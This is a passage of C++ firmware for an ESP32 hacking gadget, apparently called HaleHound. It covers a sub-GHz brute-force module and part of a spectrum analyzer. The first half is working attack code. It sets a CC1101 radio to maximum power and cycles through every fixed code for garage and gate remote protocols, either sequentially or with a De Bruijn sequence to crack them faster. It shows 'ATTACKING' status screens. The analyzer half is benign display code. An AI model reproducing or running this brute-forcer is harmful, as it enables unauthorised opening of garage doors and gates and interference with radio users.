    tft.fillRect(15, SCALE_Y(65), CONTENT_INNER_W - 10, SCALE_Y(22), TFT_BLACK);
    drawCenteredFreeFont(SCALE_Y(84), proto.name, HALEHOUND_MAGENTA, &FreeMonoBold12pt7b);

    // Frequency below protocol name
    char freqBuf[16];
    snprintf(freqBuf, sizeof(freqBuf), "%.3f MHz", proto.frequency / 1000000.0);
    tft.fillRect(15, SCALE_Y(90), CONTENT_INNER_W - 10, SCALE_Y(20), TFT_BLACK);
    drawCenteredFreeFont(SCALE_Y(105), freqBuf, HALEHOUND_BRIGHT, &FreeMono9pt7b);

    // Mode indicator
    tft.setFreeFont(NULL);
    tft.setTextSize(1);
    tft.setCursor(15, SCALE_Y(120));
    tft.setTextColor(HALEHOUND_MAGENTA, TFT_BLACK);
    tft.print("Mode: ");
    tft.setTextColor(HALEHOUND_HOTPINK, TFT_BLACK);
    tft.print(useDeBruijn ? "DE BRUIJN" : "SEQUENTIAL");

    // Bits info
    tft.setCursor(SCALE_X(140), SCALE_Y(120));
    tft.setTextColor(HALEHOUND_MAGENTA, TFT_BLACK);
    tft.print("Bits: ");
    tft.setTextColor(HALEHOUND_BRIGHT, TFT_BLACK);
    tft.print(proto.bitLength);
}

static void updateDisplay() {
    if (millis() - lastDisplayUpdate < 100) return;
    lastDisplayUpdate = millis();

    const ProtocolDef& proto = protocols[currentProtocol];

    // Calculate progress
    float progress = 0;
    if (running) {
        if (useDeBruijn) {
            uint32_t totalBits = deBruijnLength + protocols[currentProtocol].bitLength - 1;
            progress = (totalBits > 0) ? (deBruijnBit * 100.0 / totalBits) : 0;
        } else {
            uint32_t total = endCode - startCode + 1;
            uint32_t done = currentCode - startCode;
            progress = (total > 0) ? (done * 100.0 / total) : 0;
        }
    }

    // Status area (below protocol frame)
    tft.fillRect(0, SCALE_Y(135), SCREEN_WIDTH, SCALE_Y(60), TFT_BLACK);

    // Status text with pulsing effect when attacking
    static bool statusBlink = false;
    statusBlink = !statusBlink;

    if (running) {
        if (paused) {
            drawCenteredFreeFont(SCALE_Y(155), "PAUSED", HALEHOUND_VIOLET, &FreeMonoBold12pt7b);
        } else {
            uint16_t statusColor = statusBlink ? HALEHOUND_HOTPINK : tft.color565(200, 50, 100);
            drawCenteredFreeFont(SCALE_Y(155), "ATTACKING", statusColor, &FreeMonoBold12pt7b);
        }

        // Progress bar
        drawGradientProgressBar(15, SCALE_Y(165), CONTENT_INNER_W - 10, 16, progress);

        // Stats line
        tft.setFreeFont(NULL);
        tft.setTextSize(1);
        tft.setTextColor(HALEHOUND_MAGENTA, TFT_BLACK);
        tft.setCursor(15, SCALE_Y(185));
        if (useDeBruijn) {
            uint32_t totalBits = deBruijnLength + proto.bitLength - 1;
            tft.printf("Bit: %lu/%lu ", deBruijnBit, totalBits);
        } else {
            tft.printf("Code: %lu/%lu", currentCode, endCode);
        }

        // Time elapsed
        unsigned long elapsed = (millis() - startTime) / 1000;
        tft.setCursor(SCALE_X(160), SCALE_Y(185));
        tft.printf("Time: %lu:%02lu", elapsed / 60, elapsed % 60);

    } else {
        drawCenteredFreeFont(SCALE_Y(155), "READY", HALEHOUND_BRIGHT, &FreeMonoBold12pt7b);
        tft.setFreeFont(NULL);
        tft.setTextSize(1);
        tft.setTextColor(HALEHOUND_VIOLET, TFT_BLACK);
        tft.setCursor(SCALE_X(55), SCALE_Y(175));
        tft.print("TAP TO START ATTACK");
    }
    // Equalizer is updated in main loop()
}

// Transmit a complete code using RCSwitch
static void transmitCode(uint32_t code, const ProtocolDef& proto) {
    bruteSwitch.setProtocol(1);
    bruteSwitch.setPulseLength(proto.shortPulse);

    for (int rep = 0; rep < proto.repetitions; rep++) {
        bruteSwitch.send(code, proto.bitLength);
        delayMicroseconds(proto.interCodeDelay);
        if (!running) break;
        yield();
    }
}

// Run sequential brute force
static void runSequentialBrute(const ProtocolDef& proto) {
    ELECHOUSE_cc1101.setModulation(2);
    ELECHOUSE_cc1101.setMHZ(proto.frequency / 1000000.0);
    ELECHOUSE_cc1101.setPA(12);
    cc1101PaSetTx();

    bruteSwitch.enableTransmit(CC1101_GDO0);

    while (currentCode <= endCode && running) {
        if (paused) {
            delay(50);
            touchButtonsUpdate();
            if (buttonPressed(BTN_DOWN)) {
                paused = false;
                delay(200);
            }
            // BOOT button or back tap to stop
            if (IS_BOOT_PRESSED() || isBackButtonTapped()) {
                running = false;
                break;
            }
            continue;
        }

        transmitCode(currentCode, proto);
        currentCode++;

        // HARD STOP - BOOT button
        if (IS_BOOT_PRESSED()) {
            running = false;
            break;
        }

        // Touch stop - check every iteration
        if (isBackButtonTapped()) {
            running = false;
            break;
        }

        // Update display every 32 codes
        if ((currentCode & 0x1F) == 0) {
            updateDisplay();
            yield();
        }
    }

    bruteSwitch.disableTransmit();
    cc1101PaSetIdle();
}

// Run De Bruijn optimized brute force
static void runDeBruijnBrute(const ProtocolDef& proto) {
    ELECHOUSE_cc1101.setModulation(2);
    ELECHOUSE_cc1101.setMHZ(proto.frequency / 1000000.0);
    ELECHOUSE_cc1101.setPA(12);
    cc1101PaSetTx();

    bruteSwitch.enableTransmit(CC1101_GDO0);

    initDeBruijn(proto.bitLength);
    if (!deBruijnHasMore) {
        cc1101PaSetIdle();
        return;
    }

    int bit;
    uint32_t currentWord = 0;
    int bitsCollected = 0;

    while ((bit = nextDeBruijnBit()) >= 0 && running) {
        if (paused) {
            delay(50);
            touchButtonsUpdate();
            if (buttonPressed(BTN_DOWN)) {
                paused = false;
                delay(200);
            }
            // BOOT button or back tap to stop
            if (IS_BOOT_PRESSED() || isBackButtonTapped()) {
                running = false;
                break;
            }
            continue;
        }

        // Build up bits into code words
        currentWord = ((currentWord << 1) | bit) & ((1UL << proto.bitLength) - 1);
        bitsCollected++;
        deBruijnBit++;

        // Once we have enough bits, transmit the code
        if (bitsCollected >= proto.bitLength) {
            transmitCode(currentWord, proto);

            // HARD STOP - BOOT button
            if (IS_BOOT_PRESSED()) {
                running = false;
                break;
            }

            // Touch stop
            if (isBackButtonTapped()) {
                running = false;
                break;
            }

            // Update display every 32 codes
            if ((deBruijnBit & 0x1F) == 0) {
                updateDisplay();
                yield();
            }
        }
    }

    cleanupDeBruijn();
    bruteSwitch.disableTransmit();
    cc1101PaSetIdle();
}

void setup() {
    if (initialized) return;

    #if CYD_DEBUG
    Serial.println("[BRUTE] Initializing SubGHz Brute Force...");
    #endif

    // Initialize TX indicator
    txPulse = 0;

    tft.fillScreen(HALEHOUND_BLACK);
    drawStatusBar();
    drawIconBar();

    // Deselect other SPI devices
    pinMode(NRF24_CSN, OUTPUT);
    digitalWrite(NRF24_CSN, HIGH);
    pinMode(SD_CS, OUTPUT);
    digitalWrite(SD_CS, HIGH);

    // Reset SPI bus so ELECHOUSE can configure fresh
    SPI.end();
    delay(5);

    // Safe check — ELECHOUSE has blocking MISO loops that freeze with no CC1101
    if (!cc1101SafeCheck()) {
        #if CYD_DEBUG
        Serial.println("[BRUTE] CC1101 not detected (safe check)");
        #endif
        return;
    }

    // Configure CC1101 SPI and GDO pins
    ELECHOUSE_cc1101.setSpiPin(RADIO_SPI_SCK, RADIO_SPI_MISO, RADIO_SPI_MOSI, CC1101_CS);
    ELECHOUSE_cc1101.setGDO(CC1101_GDO0, CC1101_GDO2);

    // Initialize CC1101
    if (ELECHOUSE_cc1101.getCC1101()) {
        ELECHOUSE_cc1101.Init();
        ELECHOUSE_cc1101.setModulation(2);
        ELECHOUSE_cc1101.setMHZ(protocols[currentProtocol].frequency / 1000000.0);
        ELECHOUSE_cc1101.setPA(12);  // Max power

        #if CYD_DEBUG
        Serial.println("[BRUTE] CC1101 initialized at max power");
        #endif
    } else {
        #if CYD_DEBUG
        Serial.println("[BRUTE] CC1101 not found!");
        #endif
        tft.setTextColor(TFT_RED);
        tft.setCursor(10, 100);
        tft.print("ERROR: CC1101 not found!");
        delay(2000);
    }

    // Reset state
    running = false;
    paused = false;
    currentCode = 0;
    exitRequested = false;

    cleanupDeBruijn();

    // Draw the new ProtoKill-style UI
    drawMainUI();
    drawEqualizer();
    updateDisplay();

    initialized = true;
}

void loop() {
    if (!initialized) return;

    // ═══════════════════════════════════════════════════════════════════════
    // TOUCH HANDLING - Touch zones reference sbIconX[] for screen scaling
    // sbIconX: [0]=Power, [1]=Down, [2]=Up, [3]=Random, [4]=Back
    // ═══════════════════════════════════════════════════════════════════════
    touchButtonsUpdate();

    uint16_t tx, ty;
    if (getTouchPoint(&tx, &ty)) {
        // Icon bar area
        if (ty >= ICON_BAR_TOUCH_TOP && ty <= ICON_BAR_TOUCH_BOTTOM) {
            // Back icon (sbIconX[4])
            if (tx >= (sbIconX[4] - 5) && tx <= (sbIconX[4] + 20)) {
                running = false;
                stopAttack();
                exitRequested = true;
                return;
            }
            // Power/Toggle icon (sbIconX[0])
            if (tx >= (sbIconX[0] - 10) && tx <= (sbIconX[0] + 20)) {
                if (running) {
                    stopAttack();
                } else {
                    startAttack();
                }
                waitForTouchRelease();
            }
            // Down/Prev protocol (sbIconX[1])
            if (tx >= (sbIconX[1] - 10) && tx <= (sbIconX[1] + 20) && !running) {
                prevProtocol();
                waitForTouchRelease();
            }
            // Up/Next protocol (sbIconX[2])
            if (tx >= (sbIconX[2] - 10) && tx <= (sbIconX[2] + 20) && !running) {
                nextProtocol();
                waitForTouchRelease();
            }
            // Random/Toggle De Bruijn (sbIconX[3])
            if (tx >= (sbIconX[3] - 10) && tx <= (sbIconX[3] + 20) && !running) {
                toggleDeBruijn();
                waitForTouchRelease();
            }
        }
        // Center screen tap = toggle attack (scaled for 2.8" and 3.5")
        if (ty > CONTENT_Y_START && ty < SCALE_Y(195)) {
            if (running) {
                stopAttack();
            } else {
                startAttack();
            }
            waitForTouchRelease();
        }
    }

    // Hardware button handling
    if (buttonPressed(BTN_BACK) || buttonPressed(BTN_BOOT)) {
        running = false;
        stopAttack();
        exitRequested = true;
        return;
    }

    if (buttonPressed(BTN_LEFT) && !running) {
        prevProtocol();
    }
    if (buttonPressed(BTN_RIGHT) && !running) {
        nextProtocol();
    }
    if (buttonPressed(BTN_UP) && !running) {
        toggleDeBruijn();
    }
    if (buttonPressed(BTN_SELECT)) {
        if (running) stopAttack();
        else startAttack();
    }

    // ═══════════════════════════════════════════════════════════════════════
    // ATTACK LOGIC - one code per loop, fast return to touch handling
    // ═══════════════════════════════════════════════════════════════════════
    if (running && !paused) {
        const ProtocolDef& proto = protocols[currentProtocol];

        // Pulse equalizer BEFORE transmit so it shows activity
        pulseEqualizer(40);

        if (useDeBruijn) {
            // De Bruijn mode: overlapping code windows
            // Each new bit shifts into a running code word — adjacent codes share N-1 bits
            // This means ALL possible codes are transmitted with only 2^N + N-1 total bits
            int bit = nextDeBruijnBit();
            if (bit < 0) {
                stopAttack();
                return;
            }
            currentCode = ((currentCode << 1) | bit) & ((1UL << proto.bitLength) - 1);
            deBruijnBit++;

            // Transmit once we've collected a full code worth of bits
            if (deBruijnBit >= (uint32_t)proto.bitLength) {
                transmitCode(currentCode, proto);
            }
        } else {
            // Sequential mode: transmit current code, increment
            transmitCode(currentCode, proto);
            currentCode++;
            if (currentCode > endCode) {
                stopAttack();
            }
        }

        // *** CRITICAL: Check touch IMMEDIATELY after transmit ***
        uint16_t tx2, ty2;
        if (getTouchPoint(&tx2, &ty2)) {
            stopAttack();
            waitForTouchRelease();
            return;
        }

        if (!running) return;

        // Update status display every 32 iterations
        uint32_t counter = useDeBruijn ? deBruijnBit : currentCode;
        if ((counter & 0x1F) == 0) {
            updateDisplay();
        }
    }

    // Update TX indicator
    updateEqualizer();
}

void startAttack() {
    if (running) return;

    const ProtocolDef& proto = protocols[currentProtocol];

    // Initialize state based on mode
    if (useDeBruijn) {
        // De Bruijn: overlapping codes, WAY faster than sequential
        // 12-bit CAME: 4096 codes in ~8 sec vs ~4 min sequential (Samy Kamkar, OpenSesame)
        initDeBruijn(proto.bitLength);
        deBruijnBit = 0;
        currentCode = 0;
        startCode = 0;
        endCode = deBruijnLength + proto.bitLength - 1;  // Total bits in sequence
    } else {
        // Sequential: every code from 0 to max
        cleanupDeBruijn();
        startCode = 0;
        endCode = (1UL << proto.bitLength) - 1;
        currentCode = startCode;
    }

    startTime = millis();
    running = true;
    paused = false;

    // Configure CC1101 for TX
    ELECHOUSE_cc1101.setModulation(2);  // ASK/OOK
    ELECHOUSE_cc1101.setMHZ(proto.frequency / 1000000.0);
    ELECHOUSE_cc1101.setPA(12);  // Max power
    cc1101PaSetTx();

    // Enable RCSwitch TX
    bruteSwitch.enableTransmit(CC1101_GDO0);

    #if CYD_DEBUG
    Serial.printf("[BRUTE] Starting %s: %s @ %.2f MHz (%lu total)\n",
                  useDeBruijn ? "De Bruijn" : "Sequential",
                  proto.name, proto.frequency / 1000000.0, endCode);
    #endif

    updateDisplay();
    // Attack runs in loop() - non-blocking!
}

void stopAttack() {
    running = false;
    paused = false;

    // Cleanup TX + De Bruijn state
    bruteSwitch.disableTransmit();
    cc1101PaSetIdle();
    if (useDeBruijn) cleanupDeBruijn();

    #if CYD_DEBUG
    Serial.printf("[BRUTE] Stopped at %s %lu\n", useDeBruijn ? "bit" : "code", useDeBruijn ? deBruijnBit : currentCode);
    #endif

    updateDisplay();
}

void togglePause() {
    if (running) {
        paused = !paused;
        updateDisplay();
    }
}

bool isRunning() {
    return running;
}

bool isPaused() {
    return paused;
}

void setProtocol(int proto) {
    if (proto >= 0 && proto < PROTO_COUNT) {
        currentProtocol = proto;
        ELECHOUSE_cc1101.setMHZ(protocols[currentProtocol].frequency / 1000000.0);
        updateDisplay();
    }
}

int getProtocol() {
    return currentProtocol;
}

void nextProtocol() {
    currentProtocol = (currentProtocol + 1) % PROTO_COUNT;
    ELECHOUSE_cc1101.setMHZ(protocols[currentProtocol].frequency / 1000000.0);
    drawMainUI();  // Redraw protocol frame
    updateDisplay();
}

void prevProtocol() {
    currentProtocol = (currentProtocol - 1 + PROTO_COUNT) % PROTO_COUNT;
    ELECHOUSE_cc1101.setMHZ(protocols[currentProtocol].frequency / 1000000.0);
    drawMainUI();  // Redraw protocol frame
    updateDisplay();
}

const char* getProtocolName(int proto) {
    if (proto >= 0 && proto < PROTO_COUNT) {
        return protocols[proto].name;
    }
    return "Unknown";
}

void toggleDeBruijn() {
    useDeBruijn = !useDeBruijn;

    #if CYD_DEBUG
    Serial.println("[BRUTE] Mode: " + String(useDeBruijn ? "De Bruijn" : "Sequential"));
    #endif

    drawMainUI();  // Redraw to show mode change
    updateDisplay();
}

bool isDeBruijn() {
    return useDeBruijn;
}

float getProgress() {
    const ProtocolDef& proto = protocols[currentProtocol];

    if (useDeBruijn && running) {
        uint32_t totalBits = deBruijnLength + proto.bitLength - 1;
        return (totalBits > 0) ? (deBruijnBit * 100.0 / totalBits) : 0;
    } else if (running) {
        uint32_t total = endCode - startCode + 1;
        uint32_t done = currentCode - startCode;
        return (total > 0) ? (done * 100.0 / total) : 0;
    }
    return 0;
}

uint32_t getCurrentCode() {
    return currentCode;
}

uint32_t getMaxCode() {
    return (1UL << protocols[currentProtocol].bitLength) - 1;
}

bool isExitRequested() {
    return exitRequested;
}

void cleanup() {
    if (running) {
        stopAttack();
    }
    cleanupDeBruijn();
    cc1101PaSetIdle();
    spiDeselect();

    initialized = false;
    exitRequested = false;

    #if CYD_DEBUG
    Serial.println("[BRUTE] Cleanup complete");
    #endif
}

}  // namespace SubBrute


// ═══════════════════════════════════════════════════════════════════════════
// SUBGHZ SPECTRUM ANALYZER IMPLEMENTATION
// ═══════════════════════════════════════════════════════════════════════════

namespace SubAnalyzer {

// ═══════════════════════════════════════════════════════════════════════════
// ICON BAR — MATCHES HALEHOUND STANDARD
// ═══════════════════════════════════════════════════════════════════════════

#define SA_ICON_SIZE 16
#define SA_ICON_NUM 4
static int saIconX[SA_ICON_NUM] = {SCALE_X(130), SCALE_X(170), SCALE_X(210), 10};
static const unsigned char* saIcons[SA_ICON_NUM] = {
    bitmap_icon_power,             // 0: Start/Stop
    bitmap_icon_undo,              // 1: Clear/Reset
    bitmap_icon_antenna,           // 2: (reserved)
    bitmap_icon_go_back            // 3: Back
};

// Draw icon bar
static void drawAnalyzerUI() {
    tft.drawLine(0, ICON_BAR_TOP, SCREEN_WIDTH, ICON_BAR_TOP, HALEHOUND_MAGENTA);
    tft.fillRect(0, ICON_BAR_Y, SCREEN_WIDTH, ICON_BAR_H, HALEHOUND_GUNMETAL);
    for (int i = 0; i < SA_ICON_NUM; i++) {
        tft.drawBitmap(saIconX[i], ICON_BAR_Y, saIcons[i], SA_ICON_SIZE, SA_ICON_SIZE, HALEHOUND_MAGENTA);
    }
    tft.drawLine(0, ICON_BAR_BOTTOM, SCREEN_WIDTH, ICON_BAR_BOTTOM, HALEHOUND_HOTPINK);
}

// ═══════════════════════════════════════════════════════════════════════════
// FREQUENCY LIST — 33 SubGHz channels across CC1101 bands
// ═══════════════════════════════════════════════════════════════════════════

static const float frequencyListMHz[] = {
    // 300-348 MHz band (US garage/auto remotes)
    300.000, 302.000, 303.875, 304.250, 306.000, 310.000,
    313.000, 315.000, 318.000, 330.000, 345.000,
    // 387-464 MHz ISM band (most active SubGHz)
    390.000, 400.000, 418.000, 426.000, 430.000,
    433.075, 433.420, 433.920, 434.420, 434.775, 438.900,
    // 779-928 MHz (EU/US ISM, LoRa)
    779.000, 868.000, 868.350, 900.000, 903.000,
    906.000, 910.000, 915.000, 920.000, 925.000, 928.000
};
static const int frequencyCount = sizeof(frequencyListMHz) / sizeof(frequencyListMHz[0]);
#define SA_MAX_FREQ 64  // Max array size for frequency data

// ═══════════════════════════════════════════════════════════════════════════
// SDR-STYLE DISPLAY LAYOUT
// ═══════════════════════════════════════════════════════════════════════════
//
// ┌──────────────────────────────────────┐ y=0
// │ Status Bar                           │
// ├──────────────────────────────────────┤ y=20
// │ Icon Bar (Start/Stop, Clear, Back)   │
// ╞══════════════════════════════════════╡ y=37
// │                                      │
// │  SPECTRUM BARS (33 LED VU meters)    │
// │  (6px wide, heat palette per bar)    │
// │  Peak hold dots in hot pink          │
// │                                      │
// ├──── hot pink separator ──────────────┤ y=188
// │                                      │
// │  WAVEFORM LINE GRAPH                 │
// │  (current signal levels)             │
// │  Teal → Hot Pink gradient line       │
// │                                      │
// ├──────────────────────────────────────┤ y=268
// │ ─axis─  300      434      925  MHz   │
// ├──────────────────────────────────────┤ y=284
// │ Peak: 433.9MHz Lv:85  SCANNING       │
// │ Row: 42/150                          │
// └──────────────────────────────────────┘ y=319
//
// ═══════════════════════════════════════════════════════════════════════════

#define WF_X        2           // Left margin for drawing area
#define WF_Y        CONTENT_Y_START    // Waterfall top (below icon bar + 1px gap)
#define WF_WIDTH_MAX 316               // Max drawing width for arrays (320 - 4 for landscape)
#define WF_WIDTH    (tft.width() - 4)  // Runtime drawing width (screen - 4px margins)
#define WF_HEIGHT   SCALE_Y(150)       // Waterfall rows of history

#define SEP_Y       (WF_Y + WF_HEIGHT) // Hot pink separator line

#define LG_Y        (SEP_Y + 2)        // Line graph top
#define LG_HEIGHT   SCALE_Y(78)        // Line graph height

#define AXIS_Y      (LG_Y + LG_HEIGHT) // X axis line position
#define LABEL_Y     (AXIS_Y + 3)       // Frequency label text Y

#define STATUS_Y    (LABEL_Y + 13)     // Status text area

// ═══════════════════════════════════════════════════════════════════════════
// DATA ARRAYS
// ═══════════════════════════════════════════════════════════════════════════

static uint8_t rssiLevels[SA_MAX_FREQ];     // Raw RSSI per freq (0-125)
static uint8_t peakLevels[SA_MAX_FREQ];     // Smoothed for display (0-125)

// Spectrum bars (LED VU meter style — 33 bars, 6px wide, 1px gap)
#define BAR_WIDTH   6
#define BAR_GAP     1
#define BAR_STRIDE  (BAR_WIDTH + BAR_GAP)   // 7px per bar — 33*7-1 = 230px
#define SEG_HEIGHT  4
#define SEG_GAP     1
#define SEG_STRIDE  (SEG_HEIGHT + SEG_GAP)  // 5px per segment
#define SEG_COUNT   (WF_HEIGHT / SEG_STRIDE) // 30 segments

static uint8_t peakHoldSeg[SA_MAX_FREQ];        // Peak hold segment index per bar (falling dot)
static unsigned long peakHoldTime[SA_MAX_FREQ];  // Timestamp of last peak hit
static uint8_t prevBarSegs[SA_MAX_FREQ];         // Previous frame's lit segment count (flicker-free)

// Line graph (flicker-free erase/redraw)
static int16_t prevLineY[WF_WIDTH_MAX]; // Previous frame's Y positions (max size for any rotation)
static bool prevLineValid = false;       // False until first frame drawn

// Heat map palette (128 pre-computed 16-bit colors)
static uint16_t heatPalette[128];

// State
static bool initialized = false;
static volatile bool exitRequested = false;
static volatile bool scanning = true;
static unsigned long lastStatusDraw = 0;

// ═══════════════════════════════════════════════════════════════════════════
// DUAL-CORE ENGINE — Core 0 does CC1101 scanning, Core 1 draws
// 17-channel scan takes ~18.7ms — moved off Core 1 for responsive UI
// ═══════════════════════════════════════════════════════════════════════════

static TaskHandle_t saScanTaskHandle = NULL;
static volatile bool saScanTaskRunning = false;
static volatile bool saScanTaskDone = false;
static volatile bool saFrameReady = false;

// RSSI range for CC1101 — TIGHT range for SubGHz sensitivity
// Noise floor is ~-85dBm, strong close-range signal is ~-25dBm
// Wider range (-100 to -30) wastes 15dB below noise floor = dead display
static const int RSSI_FLOOR = -85;
static const int RSSI_CEIL = -25;

// ═══════════════════════════════════════════════════════════════════════════
// RSSI TO DISPLAY LEVEL (0-125)
// ═══════════════════════════════════════════════════════════════════════════

static uint8_t rssiToLevel(int rssi) {
    int clamped = constrain(rssi, RSSI_FLOOR, RSSI_CEIL);
    return (uint8_t)map(clamped, RSSI_FLOOR, RSSI_CEIL, 0, 125);
}

// ═══════════════════════════════════════════════════════════════════════════
// HEAT MAP PALETTE — HALEHOUND CYBERPUNK
// Black → Deep Purple → Electric Blue → Hot Pink → White
// Same color progression as PacketMonitor FFT waterfall
// ═══════════════════════════════════════════════════════════════════════════

static void initHeatPalette() {
    // Stage 1 (0-31): Black → Deep Purple (emerging from darkness)
    for (int i = 0; i < 32; i++) {
        byte r = (i * 15) / 31;     // 0 → 15
        byte g = 0;                  // Stay dark
        byte b = (i * 20) / 31;     // 0 → 20
        heatPalette[i] = (r << 11) | (g << 5) | b;
    }
    // Stage 2 (32-63): Deep Purple → Electric Blue (the glow begins)
    for (int i = 32; i < 64; i++) {
        int t = i - 32;
        byte r = 15 - (t * 15) / 31;    // 15 → 0 (fade red)
        byte g = (t * 31) / 31;          // 0 → 31 (cyan glow)
        byte b = 20 + (t * 11) / 31;    // 20 → 31 (max blue)
        heatPalette[i] = (r << 11) | (g << 5) | b;
    }
    // Stage 3 (64-95): Electric Blue → Hot Pink (MAXIMUM POP)
    for (int i = 64; i < 96; i++) {
        int t = i - 64;
        byte r = (t * 31) / 31;         // 0 → 31 (blast red)
        byte g = 31 - (t * 31) / 31;    // 31 → 0 (kill green)
        byte b = 31;                     // Stay max blue
        heatPalette[i] = (r << 11) | (g << 5) | b;
    }
    // Stage 4 (96-127): Hot Pink → White (blowout at peak intensity)
    for (int i = 96; i < 128; i++) {
        int t = i - 96;
        byte r = 31;                     // Max red
        byte g = (t * 63) / 31;         // 0 → 63 (add green for white)
        byte b = 31;                     // Max blue
        heatPalette[i] = (r << 11) | (g << 5) | b;
    }
}

// ═══════════════════════════════════════════════════════════════════════════
// DISPLAY BOOST — Noise gate + sqrt amplification for visual contrast
// Raw levels below 8 = noise floor → crushed to black
// Signals above 8 get sqrt boost: level 18→42, 50→82, 80→108
// ═══════════════════════════════════════════════════════════════════════════

#define NOISE_GATE 15       // Raw levels below this = hard cutoff
#define DISPLAY_THRESH 40   // Boosted levels below this = still black (kills noise floor color)

// Pre-computed cube root lookup table — replaces powf() per pixel
static uint8_t displayLUT[126];  // displayLevel(0..125)
static bool displayLUTReady = false;

static void initDisplayLUT() {
    displayLUT[0] = 0;
    for (int i = 1; i <= 125; i++) {
        if (i < NOISE_GATE) { displayLUT[i] = 0; continue; }
        float normalized = (float)(i - NOISE_GATE) / (float)(125 - NOISE_GATE);
        uint8_t boosted = (uint8_t)(powf(normalized, 0.33f) * 125.0f);
        displayLUT[i] = (boosted < DISPLAY_THRESH) ? 0 : boosted;
    }
    displayLUTReady = true;
}

static uint8_t displayLevel(uint8_t raw) {
    if (raw > 125) raw = 125;
    return displayLUT[raw];
}

// ═══════════════════════════════════════════════════════════════════════════
// INTERPOLATION — Smooth 17 discrete frequencies to WF_WIDTH pixels
// ═══════════════════════════════════════════════════════════════════════════

static uint8_t interpolateLevel(int pixelX) {
    float freqPos = (float)pixelX * (frequencyCount - 1) / (float)(WF_WIDTH - 1);
    int idx = (int)freqPos;
    float frac = freqPos - idx;
    uint8_t raw;
    if (idx >= frequencyCount - 1) {
        raw = peakLevels[frequencyCount - 1];
    } else {
        raw = (uint8_t)((1.0f - frac) * peakLevels[idx] + frac * peakLevels[idx + 1]);
    }
    return displayLevel(raw);  // Noise gate + sqrt boost
}

// ═══════════════════════════════════════════════════════════════════════════
// SPECTRUM BARS — LED VU meter style (17 bars, 30 segments each)
// Each bar = one frequency. Segments light bottom-to-top with heat palette.
// Peak hold dots in hot pink fall slowly after signal drops.
// Only changed segments are redrawn — zero flicker.
// ═══════════════════════════════════════════════════════════════════════════

static void drawSpectrumBars() {
    for (int ch = 0; ch < frequencyCount; ch++) {
        int barX = WF_X + ch * BAR_STRIDE;
        uint8_t level = displayLevel(peakLevels[ch]);

        // How many segments to light (0 to SEG_COUNT)
        int litSegs = ((int)level * SEG_COUNT) / 125;
        if (litSegs > SEG_COUNT) litSegs = SEG_COUNT;

        // ── Peak hold tracking ──────────────────────────────────────────
        if (litSegs > (int)peakHoldSeg[ch]) {
            peakHoldSeg[ch] = litSegs;
            peakHoldTime[ch] = millis();
        } else if (millis() - peakHoldTime[ch] > 400) {
            // Slow fall after 400ms hold
            if (peakHoldSeg[ch] > 0) peakHoldSeg[ch]--;
        }

        int prev = prevBarSegs[ch];

        // ── Draw only changed segments (incremental update) ─────────────
        if (litSegs > prev) {
            // New segments lighting up (draw from prev to litSegs)
            for (int s = prev; s < litSegs; s++) {
                int segY = WF_Y + WF_HEIGHT - (s + 1) * SEG_STRIDE;
                // Color based on segment POSITION — bottom=purple, top=white
                int palIdx = (s * 127) / (SEG_COUNT - 1);
                tft.fillRect(barX, segY, BAR_WIDTH, SEG_HEIGHT, heatPalette[palIdx]);
            }
        } else if (litSegs < prev) {
            // Segments turning off (erase from litSegs to prev)
            for (int s = litSegs; s < prev; s++) {
                int segY = WF_Y + WF_HEIGHT - (s + 1) * SEG_STRIDE;
                tft.fillRect(barX, segY, BAR_WIDTH, SEG_HEIGHT, TFT_BLACK);
            }
        }

        // ── Peak hold dot ───────────────────────────────────────────────
        // Erase old peak position if it moved
        int peakSeg = (int)peakHoldSeg[ch];
        // Always redraw peak dot area (may have been erased by bar change)
        if (peakSeg > litSegs && peakSeg > 0) {
            int peakY = WF_Y + WF_HEIGHT - (peakSeg) * SEG_STRIDE;
            // Erase segment above peak (in case peak fell)
            if (peakSeg + 1 <= SEG_COUNT) {
                int aboveY = WF_Y + WF_HEIGHT - (peakSeg + 1) * SEG_STRIDE;
                tft.fillRect(barX, aboveY, BAR_WIDTH, SEG_HEIGHT, TFT_BLACK);
            }
            tft.fillRect(barX, peakY, BAR_WIDTH, SEG_HEIGHT, HALEHOUND_HOTPINK);
        }

        prevBarSegs[ch] = litSegs;
    }
}

// ═══════════════════════════════════════════════════════════════════════════
// LINE GRAPH — Waveform display (teal→hot pink gradient, flicker-free)
//
// Uses erase-old/draw-new technique:
// 1. Draw over previous line segments in black (erase)
// 2. Compute new line Y positions from current signal levels
// 3. Draw new line segments with gradient color
// 4. Redraw axes (may have been partially erased)
//
// This avoids fillRect entirely — zero flicker on the line graph.
// ═══════════════════════════════════════════════════════════════════════════

static void drawLineGraph() {
    int16_t newLineY[WF_WIDTH_MAX];
    uint8_t newLevels[WF_WIDTH_MAX];  // Store display levels for color lookup

    // Phase 1: Erase previous line (draw over in black)
    if (prevLineValid) {
        for (int x = 1; x < WF_WIDTH; x++) {
            tft.drawLine(WF_X + x - 1, prevLineY[x - 1],
                         WF_X + x,     prevLineY[x], TFT_BLACK);
        }
    }

    // Phase 2: Compute new line Y positions + store levels
    for (int x = 0; x < WF_WIDTH; x++) {
        uint8_t level = interpolateLevel(x);
        newLevels[x] = level;
        int barH = ((int)level * (LG_HEIGHT - 1)) / 125;
        if (barH < 0) barH = 0;
        if (barH > LG_HEIGHT - 1) barH = LG_HEIGHT - 1;
        newLineY[x] = LG_Y + (LG_HEIGHT - 1) - barH;
    }

    // Phase 3: Draw new line — HEAT MAP PALETTE (matches waterfall colors)
    // No signal = dim gunmetal baseline, spikes light up purple→blue→pink→white
    for (int x = 1; x < WF_WIDTH; x++) {
        // Average the display levels of both endpoints for segment color
        int avgLevel = ((int)newLevels[x - 1] + (int)newLevels[x]) / 2;
        uint16_t color;
        if (avgLevel <= 0) {
            color = HALEHOUND_GUNMETAL;  // Dim baseline when no signal
        } else {
            int palIdx = (avgLevel * 127) / 125;
            if (palIdx > 127) palIdx = 127;
            color = heatPalette[palIdx];
        }
        tft.drawLine(WF_X + x - 1, newLineY[x - 1],
                     WF_X + x,     newLineY[x], color);
    }

    // Phase 4: Redraw axes (may have been partially erased by line)
    tft.drawFastHLine(WF_X, AXIS_Y, WF_WIDTH, HALEHOUND_MAGENTA);
    tft.drawFastVLine(WF_X - 1, LG_Y, LG_HEIGHT + 1, HALEHOUND_MAGENTA);

    // Save for next frame's erase
    memcpy(prevLineY, newLineY, sizeof(prevLineY));
    prevLineValid = true;
}

// ═══════════════════════════════════════════════════════════════════════════
// STATIC ELEMENTS — Drawn once on setup (axes, labels, separators)
// ═══════════════════════════════════════════════════════════════════════════

static void drawStaticElements() {
